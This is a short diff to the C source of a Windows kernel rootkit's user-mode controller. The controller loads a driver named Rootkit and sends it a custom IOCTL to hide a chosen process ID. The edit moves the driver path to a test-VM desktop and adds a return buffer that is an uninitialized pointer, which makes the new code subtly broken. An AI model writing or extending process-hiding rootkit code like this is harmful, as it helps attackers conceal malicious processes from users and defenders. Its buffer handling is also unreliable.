@@ -4,7 +4,10 @@
 
 #define SERVICE "Rootkit"
 #define DEVICE "\\\\.\\Rootkit"
-#define DRIVER "c:\\\\Windows\\System32\\drivers\\Rootkit.sys"
+//#define DRIVER "c:\\\\Windows\\System32\\drivers\\Rootkit.sys"
+#define DRIVER "c:\\\\Users\\IEUser\\Desktop\\Rootkit.sys"
+//#define DRIVER "C:\\\\WINDOWS\\Rootkit.sys"
+
 
 // IRP code that will call our rootkit functionality
 #define IRP_ROOTKIT_CODE 0x815
@@ -14,14 +17,15 @@ int call_kernel_driver(char * pid, HANDLE hDevice){
     printf("%s %d\n", "[+] Calling Driver, hiding PID:", atoi(pid));
 
     ULONG bytes_returned;
+    char * retbuf;
 
     BOOLEAN call_result = DeviceIoControl(
         hDevice,
         IRP_ROOTKIT_CODE,
         pid,
         strlen(pid) + 1,
-        NULL,
-        0,
+        retbuf,
+        200,
         &bytes_returned,
         (LPOVERLAPPED) NULL);
 
@@ -31,6 +35,7 @@ int call_kernel_driver(char * pid, HANDLE hDevice){
     }
 
     printf("%s\n", "[+] IRP Sent, look for your process!");
+    printf("\nReturned: %s\n", retbuf);
 }
 
 BOOL load_driver(SC_HANDLE svcHandle) {
